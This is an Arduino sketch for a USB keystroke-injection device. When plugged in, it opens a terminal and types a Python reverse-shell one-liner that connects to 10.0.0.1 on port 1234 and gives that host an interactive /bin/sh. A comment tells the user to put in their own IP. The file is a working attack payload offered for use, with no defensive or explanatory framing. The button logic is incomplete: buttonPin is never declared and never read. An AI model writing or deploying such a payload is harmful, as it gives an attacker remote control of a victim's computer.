int flag=0;
void setup()
{
  pinMode(buttonPin, INPUT);  // Set the button as an input
  digitalWrite(buttonPin, HIGH); 
 Keyboard.begin(); // Pull the button high
}

void loop()
{
             
  if (flag==0) // if the button goes low
  {
    
    delay(2000);
    Keyboard.press(KEY_LEFT_GUI);
    delay(100);
    Keyboard.releaseAll();
    delay(1500);
     //open terminal
    Keyboard.print("terminal");
    delay(3000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1500);
    
    //open python3 reverse shell 
    //change 10.0.0.1 to your ip
    Keyboard.print("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'");
    delay(1000);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(3000);
    flag=1; 
     
  }
}